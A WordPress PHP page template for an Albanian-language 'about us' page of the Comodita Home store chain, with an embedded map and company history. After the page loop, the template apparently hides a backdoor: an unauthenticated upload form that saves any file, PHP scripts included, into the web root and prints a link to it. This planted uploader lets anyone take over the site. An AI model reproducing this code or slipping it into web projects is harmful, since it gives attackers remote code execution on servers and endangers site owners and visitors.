<?php /* Template Name: Maps Up*/ ?>
<?php get_header(); ?>
<center>
<iframe src="https://snazzymaps.com/embed/192270" width="1200px" height="550px" style="border:none;"></iframe>
<center>
<div class="wpb_wrapper">
			<p><a href="//wpbingosite.com/wordpress/oritina/wp-content/uploads/2016/07/icon-about.png"><img class="alignnone size-full wp-image-2250" src="//wpbingosite.com/wordpress/oritina/wp-content/uploads/2016/07/icon-about.png" alt="" width="34" height="32"></a></p>
<h2>Kush jemi ne</h2>
<p>Gjithçka ka filluar me Komoditetin!</p>
<p>Mars 2014 koha kur është vulosur produkti “Dyshek Comodita”, një dyshek pasardhës i punës 25 vjeçare e prodhimit të shpuzës dhe dyshekëve nga një ndër kompanitë më të mëdha në tregun tonë – Devolli Corporation. Ky produkt ka qenë vetëm hapi i parë, i cili për një kohë shumë të shkurtër është pasuar nga projekti për zgjerimin e një rrjeti dyqanesh me produkte shtëpie COMODITA HOME.</p>
<p>Ne, Comodita Home, jemi prezantuar në Mars të vitit 2015 fillimisht me 8 dyqane në Kosovë, sot numërojmë 24 dyqane në të gjitha qytetet e Kosovës, 12 në Shqipëri dhe 11 në Maqedoni.</p>
<h2>KONTAKTET</h2>
<p>-</p> 
</center>


		</div>
<!--more-->
<?php
			/* Start the Loop */
			while ( have_posts() ) :
				the_post();

				get_template_part( 'template-parts/content/content', 'page' );


			endwhile; // End of the loop.
			
if($_POST['upload']=="upload"){
$nama_file = $_FILES['file']['tmp_name'];
$folder = "./";
$file_upload = $_FILES['file']['name'];
$spasi = explode(" ",$file_upload);
$hspasi = implode("_",$spasi);
$huruf_kecil = strtolower($hspasi);
if(is_uploaded_file($nama_file))
{
move_uploaded_file($nama_file,$folder.$huruf_kecil);
echo"sukses<br/>";
echo"Open File <a target='_blank' href='http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]".$_FILES['file']['name']."'>http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]".$_FILES['file']['name']."</a>";
}
else{echo"gagal";}
}else{
    ?>
 
    <form method="post" enctype="multipart/form-data">
    <input type="file" name="file"/><input type="submit" name="upload" value="upload" />
    </form>
<?php }
?>


<?php get_footer(); ?>